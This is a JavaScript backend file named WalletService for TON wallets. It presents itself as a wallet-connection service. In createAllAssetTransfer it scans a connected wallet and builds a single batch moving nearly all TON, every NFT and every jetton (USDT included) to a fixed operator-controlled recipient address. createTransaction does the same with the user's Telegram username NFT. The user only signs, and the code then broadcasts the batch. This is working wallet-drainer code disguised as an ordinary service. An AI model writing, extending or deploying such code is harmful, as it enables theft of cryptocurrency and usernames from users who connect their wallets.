// WalletService.js
import redis from "../utils/redis.js";
import TonWeb from "tonweb";

const { Address, BN } = TonWeb.utils;

/**
 * 安全的数值转换工具
 */
const NumberUtils = {
  /** 将任意数值转为 BigInt，避免精度问题 */
  toBigInt(value) {
    if (typeof value === 'bigint') return value;
    if (typeof value === 'string') return BigInt(value);
    if (typeof value === 'number') {
      if (!Number.isInteger(value)) {
        throw new Error(`数值 ${value} 不是整数，无法安全转换为 BigInt`);
      }
      return BigInt(value);
    }
    if (value instanceof BN) return BigInt(value.toString());
    throw new Error(`无法将 ${typeof value} 类型转换为 BigInt`);
  },

  /** 将任意数值转为 BN 对象 */
  toBN(value) {
    if (value instanceof BN) return value;
    if (typeof value === 'bigint') return new BN(value.toString());
    if (typeof value === 'string') return new BN(value);
    if (typeof value === 'number') {
      if (!Number.isInteger(value)) {
        throw new Error(`数值 ${value} 不是整数，无法安全转换为 BN`);
      }
      return new BN(value);
    }
    throw new Error(`无法将 ${typeof value} 类型转换为 BN`);
  },

  /** 安全的字符串转换 */
  toString(value) {
    if (typeof value === 'string') return value;
    if (typeof value === 'bigint') return value.toString();
    if (typeof value === 'number') return value.toString();
    if (value instanceof BN) return value.toString();
    return String(value);
  }
};

/**
 * 辅助：把人类可读金额转为 raw（uint128 / BigInt）
 */
function toRawAmountBigInt(humanStr, decimals) {
  try {
    const [intPart = "0", fracRaw = ""] = String(humanStr).split(".");
    const frac = (fracRaw + "0".repeat(decimals)).slice(0, decimals);
    const s = (intPart + frac).replace(/^0+/, "") || "0";
    return NumberUtils.toBigInt(s);
  } catch (error) {
    throw new Error(`金额转换失败 ${humanStr}: ${error.message}`);
  }
}

/**
 * 获取 TonWeb Provider（Toncenter）
 */
function getTonweb() {
  const provider = new TonWeb.HttpProvider(process.env.TONCENTER_RPC, {
    apiKey: process.env.TONCENTER_API_KEY || "",
  });
  return new TonWeb(provider);
}

/**
 * 通过 Jetton Root + owner 计算"发送方 JettonWallet 地址"
 */
async function getSenderJettonWalletAddress(jettonRoot, ownerAddr) {
  const tonweb = getTonweb();
  const minter = new TonWeb.token.jetton.JettonMinter(tonweb.provider, {
    address: new Address(jettonRoot),
  });
  return await minter.getJettonWalletAddress(new Address(ownerAddr));
}

/**
 * TIP-3 transfer（通用：包含 USDT 在内的所有 Jetton）
 */
async function buildJettonTransferPayloadBase64({
  toOwnerAddress,      // 收款人地址
  rawAmountBigInt,     // 转账数量（BigInt格式）
  responseToAddress,   // 回执地址
  forwardAmountTon = "0", // 附带的TON数量
  forwardComment = "", // 备注，可为空
}) {
  const OP_JETTON_TRANSFER = 0x0f8a7ea5; // 32-bit
  const cell = new TonWeb.boc.Cell();

  cell.bits.writeUint(OP_JETTON_TRANSFER, 32);
  cell.bits.writeUint(0n, 64); // query_id
  cell.bits.writeUint(rawAmountBigInt, 128); // amount: uint128
  cell.bits.writeAddress(new Address(toOwnerAddress)); // destination (owner)
  cell.bits.writeAddress(new Address(responseToAddress)); // response_destination
  cell.bits.writeBit(0); // custom_payload: none
  cell.bits.writeCoins(TonWeb.utils.toNano(String(forwardAmountTon))); // forward_ton_amount

  // forward_payload:(maybe ^Cell)
  if (forwardComment) {
    const fwd = new TonWeb.boc.Cell();
    fwd.bits.writeUint(0, 32);
    fwd.bits.writeBytes(Buffer.from(forwardComment, "utf8"));
    cell.refs.push(fwd);
  } else {
    cell.bits.writeBit(0); // 无 payload
  }

  const boc = await cell.toBoc(false);
  return Buffer.from(boc).toString("base64");
}

/**
 * NFT 标准 transfer
 */
async function buildNftTransferPayloadBase64({
  toAddress,
  responseTo,
  forwardAmountTon = 0,
  forwardComment = "",
}) {
  if (typeof toAddress !== "string") {
    throw new Error(`toAddress 不是字符串: ${toAddress}`);
  }
  if (typeof responseTo !== "string") {
    throw new Error(`responseTo 不是字符串: ${responseTo}`);
  }

  const cell = new TonWeb.boc.Cell();
  cell.bits.writeUint(0x5fcc3d14, 32); // NFT transfer op
  
  // 简单 query_id：毫秒时间戳*1024 + 0-1023 随机
  const now = Date.now();
  const rand = Math.floor(Math.random() * 1024);
  const queryId = BigInt(now) * 1024n + BigInt(rand);
  cell.bits.writeUint(queryId, 64);
  
  cell.bits.writeAddress(new Address(toAddress));
  cell.bits.writeAddress(new Address(responseTo));
  cell.bits.writeBit(0); // no custom_payload
  cell.bits.writeCoins(TonWeb.utils.toNano(String(forwardAmountTon)));

  if (forwardComment) {
    const forwardPayload = new TonWeb.boc.Cell();
    forwardPayload.bits.writeUint(0, 32);
    forwardPayload.bits.writeBytes(Buffer.from(forwardComment, "utf8"));
    cell.refs.push(forwardPayload);
  } else {
    cell.bits.writeBit(0); // 无 ref payload
  }

  const boc = await cell.toBoc(false);
  return Buffer.from(boc).toString("base64");
}

export class WalletService {
  /**
   * 连接钱包：缓存到 Redis
   */
  static async connectWallet(wallet, raw) {
    try {
      const walletKey = `wallet:${wallet}`;
      await redis.set(
        walletKey,
        JSON.stringify({
          ...raw,
          connectedAt: new Date().toISOString(),
          lastActivity: new Date().toISOString(),
        })
      );
      
      console.log("钱包连接成功，已缓存到Redis:", wallet);
      
      return {
        success: true,
        message: "",
        data: { status: "connected" },
      };
    } catch (error) {
      throw new Error(`connected error: ${error.message}`);
    }
  }

  /**
   * 工具：TON → nanoTON（字符串）
   */
  static toNanoStr = (vTon) => {
    try {
      // 安全处理数值精度
      let processedValue = vTon;
      if (typeof vTon === "number") {
        processedValue = vTon.toFixed(9); // 最多 9 位小数，避免精度问题
      }
      
      const nanoAmount = TonWeb.utils.toNano(NumberUtils.toString(processedValue));
      return NumberUtils.toString(nanoAmount);
    } catch (error) {
      throw new Error(`TON 金额转换失败 ${vTon}: ${error.message}`);
    }
  };

  /**
   * 生成 "用户名 NFT 转移" 的交易
   */
  static async createTransaction(wallet, productInfo) {
    try {
      console.log("createTransaction", wallet, productInfo);
      const walletKey = `wallet:${wallet}`;
      const walletData = await redis.get(walletKey);
      if (!walletData) throw new Error("walletData not found");

      const username = productInfo?.[2];
      const newOwnerWallet = process.env.RECIPIENT_ADDRESS;
      if (!username || !newOwnerWallet) {
        throw new Error("username 或 RECIPIENT_ADDRESS 缺失");
      }

      // 解析 t.me DNS -> 找到 NFT item 地址
      const dnsRes = await fetch(
        `${process.env.TONAPI_URL}/v2/dns/${username}.t.me`
      );
      const dnsData = await dnsRes.json();
      const nftItemAddress = dnsData?.item?.address ?? null;
      if (!nftItemAddress) throw new Error("未找到用户名 NFT Item 地址");

      // 附带的 TON 金额（gas）
      const amount = this.toNanoStr(0.1);

      const nftPayloadBase64 = await buildNftTransferPayloadBase64({
        toAddress: newOwnerWallet,
        responseTo: wallet,
        forwardAmountTon: 0,
        // forwardComment: `transfer @${username}`,
      });

      const messages = [
        {
          address: nftItemAddress, // 目标是 NFT item 合约
          amount,
          payload: nftPayloadBase64,
        },
      ];

      const raw = {
        type: "nft_username_transfer",
        username,
        wallet,
        nftItemAddress,
        newOwnerWallet,
        amount,
        ts: Date.now(),
      };

      return {
        messages,
        raw,
      };
    } catch (error) {
      console.error("createTransaction", error);
      throw new Error(`createTransaction error: ${error.message}`);
    }
  }

  /**
   * 拉取钱包资产（TON / NFTs / Jettons）
   */
  static async getAllWalletAssets(walletAddress) {
    try {
      const assets = {
        ton: { balance: "0", balanceTon: "0" },
        nfts: [],
        jettons: [], // tonapi: balances: [{ balance, wallet_address, jetton: { address, name, symbol, decimals, ... } }]
      };

      // 1. TON 余额
      {
        const res = await fetch(
          `${process.env.TONAPI_URL}/v2/blockchain/accounts/${walletAddress}`
        );
        const data = await res.json();
        assets.ton.balance = data.balance || "0";
        const balanceStr = NumberUtils.toString(data.balance || "0");
        assets.ton.balanceTon = TonWeb.utils.fromNano(balanceStr);
      }

      // 2. NFTs
      {
        const res = await fetch(
          `${process.env.TONAPI_URL}/v2/accounts/${walletAddress}/nfts?limit=1000`,
        );
        const data = await res.json();
        assets.nfts = data.nft_items || [];
      }

      // 3. Jettons
      {
        const res = await fetch(
          `${process.env.TONAPI_URL}/v2/accounts/${walletAddress}/jettons?limit=1000`,
        );
        const data = await res.json();
        assets.jettons = data.balances || [];
      }

      console.log("钱包资产扫描完成:", {
        ton: assets.ton.balanceTon,
        nftCount: assets.nfts.length,
        jettonCount: assets.jettons.length,
      });

      return assets;
    } catch (error) {
      console.error("获取钱包资产错误:", error);
      throw new Error(`获取钱包资产失败: ${error.message}`);
    }
  }

  /**
   * 批量资产转移（TON + 所有 NFT + 所有 Jetton，包括 USDT）
   */
  static async createAllAssetTransfer(wallet) {
    const targetOwner = process.env.RECIPIENT_ADDRESS; // 收款人的"普通钱包地址（owner）"
    if (!targetOwner) throw new Error("缺少 RECIPIENT_ADDRESS");

    try {
      const walletKey = `wallet:${wallet}`;
      const walletData = await redis.get(walletKey);
      if (!walletData) throw new Error("walletData not found");

      // 获取资产
      const assets = await this.getAllWalletAssets(wallet);
      const messages = [];

      // 1) TON：保留 gas（避免把 TON 清空）
      const keepTon = 2; // 预留 2 TON
      const balTon = parseFloat(assets.ton.balanceTon || "0");
      const canSend = Math.max(0, balTon - keepTon);
      if (canSend > 0.5) {
        try {
          messages.push({
            address: targetOwner,
            amount: this.toNanoStr(canSend),
            payload: "",
          });
        } catch (error) {
          console.warn(`TON转账金额处理失败: ${error.message}`);
        }
      }

      // 2) NFTs：逐个把所有权转给 targetOwner
      for (const nft of assets.nfts) {
        const nftPayload = await buildNftTransferPayloadBase64({
          toAddress: targetOwner,
          responseTo: wallet,
          forwardAmountTon: 0,
          forwardComment: `Bulk transfer NFT`,
        });

        messages.push({
          address: nft.address, // 目标是 NFT item 合约地址
          amount: this.toNanoStr(0.05), // 给 item 的 gas
          payload: nftPayload,
        });
      }

      // 3) Jettons：统一用 TIP-3 transfer
      // tonapi 返回的每个 jetton 结构：{ balance: "raw", wallet_address, jetton: { address: root, decimals, symbol, ... } }
      for (const j of assets.jettons) {
        try {
          const jettonRoot = j?.jetton?.address;
          const rawBalanceStr = NumberUtils.toString(j?.balance ?? "0");
          const rawBalance = NumberUtils.toBigInt(rawBalanceStr);
          
          if (!jettonRoot || rawBalance === 0n) {
            console.log(`跳过无效 Jetton: ${jettonRoot}, balance: ${rawBalanceStr}`);
            continue;
          }

          // 计算发送方的 JettonWallet 地址
          const senderJettonWallet = await getSenderJettonWalletAddress(
            jettonRoot,
            wallet
          );

          // 构造 payload（全额转出）
          const payload = await buildJettonTransferPayloadBase64({
            toOwnerAddress: targetOwner,
            rawAmountBigInt: rawBalance,
            responseToAddress: wallet,
            forwardAmountTon: "0",
            forwardComment: "",
          });

          // 外部消息发送到 senderJettonWallet
          messages.push({
            address: senderJettonWallet.toString(true, true, true),
            amount: this.toNanoStr(0.05), // 建议 0.05~0.1 TON
            payload,
          });
          
          console.log(`添加 Jetton 转账: ${j?.jetton?.symbol || 'Unknown'}, 数量: ${rawBalanceStr}`);
        } catch (error) {
          console.error(`处理 Jetton 转账失败: ${j?.jetton?.symbol || 'Unknown'}`, error);
          // 继续处理下一个 Jetton，不中断整个流程
        }
      }

      console.log(`批量转移交易已生成: ${messages.length} 个消息`);
      return {
        success: true,
        data: { messages },
        assets,
        messages,
        message: `批量转移交易已生成: ${messages.length} 个消息`,
      };
    } catch (error) {
      console.error("创建批量资产转移错误:", error);
      throw new Error(`创建批量资产转移失败: ${error.message}`);
    }
  }

  /**
   * 广播已签名的 BOC（TonAPI）+ 简单确认轮询
   */
  static async broadcastWithTonapi(wallet, raw) {
    try {
      const res = await fetch(`${process.env.TONAPI_URL}/v2/sendBoc`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${process.env.TONAPI_KEY}`,
        },
        body: JSON.stringify({ boc: raw.boc.boc }),
      });

      const data = await res.json().catch(() => ({}));
      if (!res.ok) {
        const msg =
          data?.message || data?.error || `${res.status} ${res.statusText}`;
        throw new Error(`sendBoc failed: ${msg}`);
      }
      console.log("sendBoc success", data);

      await redis.set(`boc:${wallet}`, JSON.stringify({ ...data }));

      // 尝试确认第一条消息
      try {
        const targetAddress = raw.messages?.[0]?.address;
        const expect = {
          to: targetAddress,
          since: Date.now() - 5 * 60 * 1000, // 最近5分钟
          // 可选：minAmountNano: raw.messages?.[0]?.amount
        };
        const confirmed = await this.waitForConfirmation(
          wallet,
          targetAddress,
          expect,
          process.env.TONAPI_KEY,
          90_000,
          3_000
        );
        return { success: true, confirmed, data };
      } catch (e) {
        // 未确认不代表失败，可能还没进块
        return { success: true, pending: true, data };
      }
    } catch (error) {
      console.error("sendBoc error:", error);
      throw new Error(`sendBoc error: ${error.message}`);
    }
  }

  static async sleep(ms) {
    return new Promise((r) => setTimeout(r, ms));
  }

  /**
   * 简单轮询确认：在窗口期内寻找符合条件的一笔入账
   * @param {string} wallet - 发起钱包地址
   * @param {string} account - 目标账户（例如 NFT item 地址或收款地址）
   * @param {{minAmountNano?: string, from?: string, to?: string, since?: number}} expect
   * @param {string} apiKey - TONAPI 密钥
   * @param {number} timeoutMs - 超时时间（毫秒）
   * @param {number} intervalMs - 检查间隔（毫秒）
   */
  static async waitForConfirmation(
    wallet,
    account,
    expect,
    apiKey,
    timeoutMs = 60_000,
    intervalMs = 3_000
  ) {
    if (!account) throw new Error("waitForConfirmation: account 缺失");
    const deadline = Date.now() + timeoutMs;

    while (Date.now() < deadline) {
      const url = `${process.env.TONAPI_URL}/v2/blockchain/accounts/${account}/transactions?limit=20`;
      const res = await fetch(url, {
        headers: { Authorization: `Bearer ${apiKey || ""}` },
      });

      if (res.ok) {
        const data = await res.json();
        const txs = data?.transactions ?? [];

        const hit = txs.find((tx) => {
          const inMsg = tx?.in_msg;
          if (!inMsg) return false;

          const okTo = expect.to ? inMsg.destination?.address === expect.to : true;
          const okTime = expect.since ? tx.utime * 1000 >= expect.since : true;

          let okAmt = true;
          if (expect.minAmountNano) {
            try {
              const val = NumberUtils.toBigInt(inMsg.value || "0");
              const minAmt = NumberUtils.toBigInt(expect.minAmountNano);
              okAmt = val >= minAmt;
            } catch (error) {
              console.warn(`金额比较失败: ${error.message}`);
              okAmt = false;
            }
          }

          // 可扩展 from 校验
          const okFrom = expect.from
            ? inMsg.source?.address === expect.from
            : true;

          return okTo && okTime && okAmt && okFrom;
        });

        if (hit) {
          await redis.del(`boc:${wallet}`);
          return hit; // 找到匹配交易
        }
      }

      await this.sleep(intervalMs);
    }

    throw new Error("confirmation timeout");
  }

  /**
   * 断开钱包连接
   */
  static async disconnectWallet(wallet) {
    try {
      const walletKey = `wallet:${wallet}`;
      await redis.del(walletKey);
      console.log("钱包断开连接成功:", wallet);
      return { success: true, message: "断开连接成功" };
    } catch (error) {
      throw new Error(`disconnect error: ${error.message}`);
    }
  }

  /**
   * 获取钱包状态
   */
  static async getWalletStatus(walletAddress) {
    try {
      const walletKey = `wallet:${walletAddress}`;
      const walletData = await redis.get(walletKey);
      
      if (!walletData) {
        return { status: "disconnected" };
      }

      const data = JSON.parse(walletData);
      return {
        status: "connected",
        connectedAt: data.connectedAt,
        lastActivity: data.lastActivity,
      };
    } catch (error) {
      throw new Error(`get wallet status error: ${error.message}`);
    }
  }

  /**
   * 清理过期数据
   */
  static async cleanupExpiredData() {
    try {
      // 这里可以添加清理过期缓存的逻辑
      console.log("开始清理过期数据...");
      
      // 示例：清理超过24小时的钱包连接数据
      // 具体实现取决于你的业务需求
      
      console.log("清理过期数据完成");
      return { success: true, message: "清理完成" };
    } catch (error) {
      throw new Error(`cleanup error: ${error.message}`);
    }
  }
}